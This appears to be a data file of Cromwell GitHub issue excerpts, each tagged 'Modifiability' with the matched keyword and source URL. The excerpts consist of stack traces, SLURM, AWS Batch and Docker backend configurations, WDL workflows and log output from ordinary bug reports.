Modifiability,"ring cwd; String out; String err; String script; String job_shell. String docker_cwd; String docker_cid; String docker_script; String docker_out; String docker_err. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowIniti",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:3856,Config,ConfigWdlNamespace,3856,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigWdlNamespace']
Modifiability,"ring] phenolist = paaaa.phenotype_out; }; }; task paaaa {; input{; String phenotype; File annotation; }; command <<<; set -eux; >>>; output {; File plots = phenotype + ""_plot.pdf""; String phenotype_out = phenotype; }; }; ```; The difference between the two being different task names, ""aaaa"" and ""paaaa"", respectively. Note that both of the workflows have an input named ""phenolist"", and an output named ""phenolist"". ; When running `womtool-85.jar inputs working.wdl`, the results are; ```json; {; ""gwas_validation.phenolist"": ""File"",; ""gwas_validation.aaaa.annotation"": ""File""; }; ```; As they should. For the failing workflow, the results are; ```; {; ""gwas_validation.phenolist"": ""File""; }; ```; As you can see, the input ""gwas_validation.paaaa.annotation"": ""File"" has been dropped.; womtool and cromwell-84 (not tested on cromwell-85) also drop all outputs from the outputs, returning only ""{}"".; The task also fails on cromwell, since cromwell does not recognize that there should be any other inputs than ""gwas_validation.phenolist"", and raises an error on that. ; Please note that this is a minified example. renaming variables, erasing variables, adding variables etc can change the failing example to working and vice versa. Based on the behaviour of the examples, I suspect this is related to building the workflow graph somehow. I have included the workflows as well as their womgraphs as files in this issue. [fail.graph.txt](https://github.com/broadinstitute/cromwell/files/11033034/fail.graph.txt); [fail.wdl.txt](https://github.com/broadinstitute/cromwell/files/11033035/fail.wdl.txt); [work.graph.txt](https://github.com/broadinstitute/cromwell/files/11033036/work.graph.txt); [work.wdl.txt](https://github.com/broadinstitute/cromwell/files/11033037/work.wdl.txt); <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ## Configuration:; Latest womtool-85.jar, downloaded from releases OR; cromwell-84.jar OR; womtool-84.jar",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7096:2618,variab,variables,2618,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7096,5,"['Config', 'config', 'variab']","['Configuration', 'configuration', 'variables']"
Modifiability,riptContents$(StandardAsyncExecutionActor.scala:318); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:639); at scala.util.Try$.apply(Try.scala:209); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:639); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:639); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardA,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5092:4105,Config,ConfigAsyncJobExecutionActor,4105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5092,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"ript} : No such file or directory; /cromwell-executions/ExomeGermlineSingleSample/118135f5-ce0e-437b-9fd2-332dd614bded/call-GenerateSubsettedContaminationResources/execution/script : No such file or directory; I attached the run file; #!/bin/bash; #SBATCH --nodes=1; #SBATCH --time=2:00:00. module load jdk. java -Dconfig.file=/mainfs/wrgl/broadinstitute_warp_development/tutorials/cromwell-slurm_5.config \; -jar /mainfs/wrgl/broadinstitute_warp_development/tutorials/cromwell-85.jar \; run /mainfs/wrgl/broadinstitute_warp_development/warp/ExomeGermlineSingleSample_v3.1.9.wdl \; -i /mainfs/wrgl/broadinstitute_warp_development/tutorials/Exom_test.json. #### Configuration file ###. include required(classpath(""application"")). system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; abort-jobs-on-terminate = false; }. backend {; default = SLURM. providers {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; temporary-directory = ""$(mktemp -d /tmp/tmp.XXXXXX)"". runtime-attributes = """"""; Int runtime_minutes = 60; Int cpu = 1; Int memory_mb = 3900; String? docker; """""". submit = """""" \; 'sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -o ${out} \; -e ${err} \; -t ${runtime_minutes} \; -p batch,scavenger \; -c ${cpu} \; --mem $(( (${memory_mb} >= ${cpu} * 3900) ? ${memory_mb} : $(( ${cpu} * 3900 )) )) \; -N 1 \; --exclusive \; --wrap ""/bin/bash ${script}""'; """""". submit-docker = """""" \. # Make sure the SINGULARITY_CACHEDIR variable is set. If not use a default; # based on the users home.; module load apptainer; if [ -z $APPTAINER_CACHEDIR ];; then CACHE_DIR=$HOME/.apptainer/cache; else CACHE_DIR=$APPTAINER_CACHEDIR; fi; # Make sure cache dir exists so lock file can be created by flock; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/apptainer_pull_flock; # Create an exclusive filelock with flock. --verbose is useful for; # for debugging, as is the echo command. These sho",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7086:1135,Config,ConfigBackendLifecycleActorFactory,1135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7086,1,['Config'],['ConfigBackendLifecycleActorFactory']
Modifiability,"rkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); cromwell_1 | 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); cromwell_1 | 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); cromwell_1 | ; cromwell_1 | 2024-01-11 11:09:38 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - BT-322 0845428a:myworkflow.mytask:-1:1 is not eligible for call caching; ```; <!-- Which backend are you running? -->; Used backend: ; GCPBATCH. Callcaching works with PAPIv2, not on GCPBATCH.; <!-- Paste/Attach your workflow if possible: -->; workflow used for testing:; ```; workflow myworkflow {; call mytask; }. task mytask {; String str = ""!""; command <<<; echo ""hello world ${str}""; >>>; output {; String out = read_string(stdout()); }. runtime{; docker: ""eu.gcr.io/project/image_name:tag""; cpu: ""1""; memory: ""500 MB""; disks: ""local-disk 5 HDD""; zones: ""europe-west1-b europe-west1-c europe-west1-d""; preemptible: 2; noAddress: true; }; }; ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; We are using cromwell through broadinstitute/cromwell:87-ecd44b6 image.; cromwell configuration:; ```; include required(classpath(""application"")). system.new-workflow-poll-rate=1. // increase timeout for http requests..... getting meta-data can timeout for large workflows.; akka.http.server.request-timeout=600s. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; system {; 	job-rate-control {; 	 jobs = 100; 	 per = 1 second; 	}; input-read-limits {; lines = 128000000; bool = 7; int = 19; float = 50; string = 1280000; json = 12800000; tsv = 1280000000; map = 128000000; object = 128000000; }. # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:7083,config,configuration,7083,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['config'],['configuration']
Modifiability,"rkflow:; ```; version 1.0. workflow SubWorkflow {; input {; String value_2_give = ""default value""; String? overwrite_value_2_give; }; call SubTask {; input:; given_value = select_first([overwrite_value_2_give, value_2_give]); }; }. task SubTask {; input {; String given_value; String? overwrite_given_value; }; command <<<; echo ~{select_first([overwrite_given_value, given_value])};; >>>; }; ```. To be sure I ran the validation mode of womtools:; ```; $ java -jar womtool-84.jar validate MainWorkflow.wdl; Success!; $ java -jar womtool-84.jar validate SubWorkflow.wdl; Success!; ```. After creating these files, I ran womtool with the ""inputs"" option getting the following output:; ```; $ java -jar womtool-84.jar inputs MainWorkflow.wdl; {; ""MainWorkflow.SubWorkflow.overwrite_value_2_give"": ""String? (optional)"",; ""MainWorkflow.MainTask.overwrite_given_value"": ""String? (optional)"",; ""MainWorkflow.value_2_give"": ""String (optional, default = \""default value\"")""; }; ```; This output json shows which variables you can (or must) provide in order to be able to run in this case the main workflow. here we see that we are able to provide values for the Mainworkflow, MainTask and SubWorkflow but not the SubTask.; If we do the same for just the subworkflow:; ```; $ java -jar womtool-84.jar inputs SubWorkflow.wdl; {; ""SubWorkflow.overwrite_value_2_give"": ""String? (optional)"",; ""SubWorkflow.SubTask.overwrite_given_value"": ""String? (optional)"",; ""SubWorkflow.value_2_give"": ""String (optional, default = \""default value\"")""; }; ```; We see that we are able to provide a value for ""overwrite_given_value"" of the SubTask. . I have tried to add the key to this anyway to the MainWorkflow input but womtools won't accept it:; ```; $ cat MainWorkflow_inputs.json; {; ""MainWorkflow.SubWorkflow.SubTask.overwrite_given_value"": ""test""; }; $ java -jar womtool-84.jar validate MainWorkflow.wdl -i MainWorkflow_inputs.json; WARNING: Unexpected input provided: MainWorkflow.SubWorkflow.SubTask.overwrite_given_v",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6841:1890,variab,variables,1890,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6841,1,['variab'],['variables']
Modifiability,"rocessing /home/jeremiah/gdc-dnaseq-cwl/tools/samtools_stats_to_sqlite.cwl; [2018-09-14 13:21:50,46] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/workflows/bamfastq_align/integrity.cwl; [2018-09-14 13:21:50,64] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/ls_l.cwl; [2018-09-14 13:21:50,71] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/md5sum.cwl; [2018-09-14 13:21:50,81] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/sha256sum.cwl; [2018-09-14 13:21:50,87] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/tools/integrity_to_sqlite.cwl; [2018-09-14 13:21:51,02] [info] Pre Processing Inputs...; [2018-09-14 13:21:51,27] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6d01716"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-09-14 13:21:51,38] [info] Metadata summary refreshing every 2 seconds.; [2018-09-14 13:21:51,44] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:21:51,45] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:21:51,51] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-09-14 13:21:52,32] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-09-14 13:21:52,35] [info] SingleWorkflowRunnerActor: Version 35-fd560e9-SNAP; [2018-09-14 13:21:52,36] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-09-14 13:21:52,42] [info] CWL (Unspecified version) workflow 6f311835-f1fe-4bbd-8fbb-c5543373d039 submitted; [2018-09-14 13:21:52,43] [info] SingleWorkflowRunnerActor: Workflow submitted 6f311835-f1fe-4bbd-8fbb-c5543373d039; [2018-09-14 13:21:52,43] [info] 1 new workflows fetched; [2018-09-14 13:21:53,05] [info] WorkflowManagerActor Starting workflow 6f311835-f1fe-4bbd-8fbb-c5543373d039; [2018-09-14 13:21:53,06] [warn] SingleWorkf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103:19462,config,configured,19462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103,1,['config'],['configured']
Modifiability,"rom `/metadata` output):. ```; ""callCaching"": {; ""hashFailures"": [; {; ""causedBy"": [],; ""message"": ""Hashing request timed out for: s3://bucketname/cromwell-tests/Panel_BWA_GATK4_Samtools_Var_Annotate/162c863f-c22a-4b7c-bb37-f5195b329b36/call-ApplyBQSR/shard-0/smallTestData.hg38.recal.bam""; }; ],; ""allowResultReuse"": false,; ""hit"": false,; ""result"": ""Cache Miss"",; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. Config file:. ```; include required(classpath(""application"")). call-caching {; enabled = true; invalidate-bad-cache-results = true; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:file:aws-database;shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 3000; }; }. aws {; application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; {; name = ""assume-role-based-on-another""; scheme = ""assume_role""; base-auth = ""default""; role-arn = ""arn:aws:iam::xxx:role/fbucketname""; }; ]; // diff 1:; # region = ""us-west-2"" // uses region from ~/.aws/config set by aws configure command,; # // or us-east-1 by default; }; engine {; filesystems {; s3 {; auth = ""assume-role-based-on-another""; }; }; }; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; // Base bucket for workflow executions; root = ""s3://bucketname/cromwell-tests""; // A reference to an auth defined in the `aws` stanza at the top. This auth is used to create; // Jobs and manipulate auth JSONs.; auth = ""default""; // diff 2:; numSubmitAttempts = 1; // diff 3:; numCreateDefinitionAttempts = 1; default-runtime-attributes {; queueArn: ""arn:aws:batch:us-west-2:xxx:job-queue/GenomicsHighPriorityQue-xxx""; }; filesystems {; s3 {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""default""; }; }; }; }; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563:2168,config,config,2168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563,3,['config'],"['config', 'configure']"
Modifiability,"romwell(CromwellApp.scala:14); 	at cromwell.CromwellApp$.delayedEndpoint$cromwell$CromwellApp$1(CromwellApp.scala:25); 	at cromwell.CromwellApp$delayedInit$body.apply(CromwellApp.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at cromwell.CromwellApp$.main(CromwellApp.scala:3); 	at cromwell.CromwellApp.main(CromwellApp.scala); Caused by: com.typesafe.config.ConfigException$Parse: /data/cephfs/punim0751/spartan.conf: 27: expecting a close parentheses ')' here, not: end of file; 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:201); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:197); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseKey(ConfigDocumentParser.java:279); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:450); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseValue(ConfigDocumentParser.java:247); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:458); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parse(ConfigDocumentParser.java:648); 	at com.typesafe.config.impl.ConfigDocumentParser.parse(ConfigDocumentParser.java:14); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:260); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:248); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); 	at com.typesafe.config.impl.Parseable.parse(Parseable.java:299); 	at c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:1894,Config,ConfigDocumentParser,1894,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,1,['Config'],['ConfigDocumentParser']
Modifiability,"romwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6c9b8d4"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2018-06-07 12:16:11,540 cromwell-system-akka.dispatchers.service-dispatcher-10 INFO - Metadata summary refreshing every 2 seconds.; 2018-06-07 12:16:11,574 cromwell-system-akka.dispatchers.service-dispatcher-8 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.actor.default-dispatcher-2 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2018-06-07 12:16:11,576 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2018-06-07 12:16:12,232 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2018-06-07 12:16:12,406 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Cromwell service started...; 2018-06-07 12:16:40,751 cromwell-system-akka.dispatchers.api-dispatcher-116 INFO - Unspecified type (Unspecified version) workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 submitted; 2018-06-07 12:16:52,348 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - 1 new workflows fetched; 2018-06-07 12:16:52,349 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - WorkflowManagerActor Starting workflow UUID(dd0b1399-ebb6-4d9b-89ea-7da193994220); 2018-06-07 12:16:52,353 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - WorkflowManagerActor Successfully started WorkflowActor-dd0b1399-ebb6-4d9b-89ea-7da193994220; 2018-06-07 12:16:52,353 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:97171,config,configured,97171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['config'],['configured']
Modifiability,"romwellApp.scala:3); 	at cromwell.CromwellApp.main(CromwellApp.scala); Caused by: com.typesafe.config.ConfigException$Parse: /data/cephfs/punim0751/spartan.conf: 27: expecting a close parentheses ')' here, not: end of file; 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:201); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:197); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseKey(ConfigDocumentParser.java:279); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:450); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseValue(ConfigDocumentParser.java:247); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:458); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parse(ConfigDocumentParser.java:648); 	at com.typesafe.config.impl.ConfigDocumentParser.parse(ConfigDocumentParser.java:14); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:260); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:248); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); 	at com.typesafe.config.impl.Parseable.parse(Parseable.java:299); 	at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:689); 	at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:51); 	at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:473); 	at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:259); 	at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:256); 	at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:65); 	at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:92); 	at com.typesafe.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:2480,Config,ConfigDocumentParser,2480,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,1,['Config'],['ConfigDocumentParser']
Modifiability,"romwell_1 | String out; cromwell_1 | String err; cromwell_1 | String script; cromwell_1 | String? docker Int? max_runtime = 2; cromwell_1 | command {; cromwell_1 | /bin/bash ${script}; cromwell_1 | }; cromwell_1 | }; cromwell_1 | ; cromwell_1 | ; cromwell_1 | task submit_docker {; cromwell_1 | ; cromwell_1 | String job_id; cromwell_1 | String job_name; cromwell_1 | String cwd; cromwell_1 | String out; cromwell_1 | String err; cromwell_1 | String script; cromwell_1 | ; cromwell_1 | String docker_cwd; cromwell_1 | String? docker Int? max_runtime = 2; cromwell_1 | command {; cromwell_1 | ; cromwell_1 | docker run \; cromwell_1 | --rm -i \; cromwell_1 | ${""--user "" + docker_user} \; cromwell_1 | --entrypoint /bin/bash \; cromwell_1 | -v ${cwd}:${docker_cwd} \; cromwell_1 | ${docker} ${script}; cromwell_1 | ; cromwell_1 | }; cromwell_1 | }; cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:50); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:37); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:37); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:40); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:39); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:49); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:48); cromwell_1 | 	at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:78); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializati",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2284:2792,config,config,2792,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2284,1,['config'],['config']
Modifiability,ronment$lzycompute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironment(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:637); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand$(StandardAsyncExecutionActor.scala:607); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:383); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:382); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6757:6120,config,config,6120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757,1,['config'],['config']
Modifiability,"ror below. Should be an easy fix. . ```; Exception in thread ""main"" com.typesafe.config.ConfigException$IO: application: application.conf: java.io.IOException: resource not found on classpath: application.conf, application.json: java.io.IOException: resource not found on classpath: application.json, application.properties: java.io.IOException: resource not found on classpath: application.properties; at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:236); at com.typesafe.config.impl.ConfigImpl.parseResourcesAnySyntax(ConfigImpl.java:133); at com.typesafe.config.ConfigFactory.parseResourcesAnySyntax(ConfigFactory.java:1083); at com.typesafe.config.impl.SimpleIncluder.includeResourceWithoutFallback(SimpleIncluder.java:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at 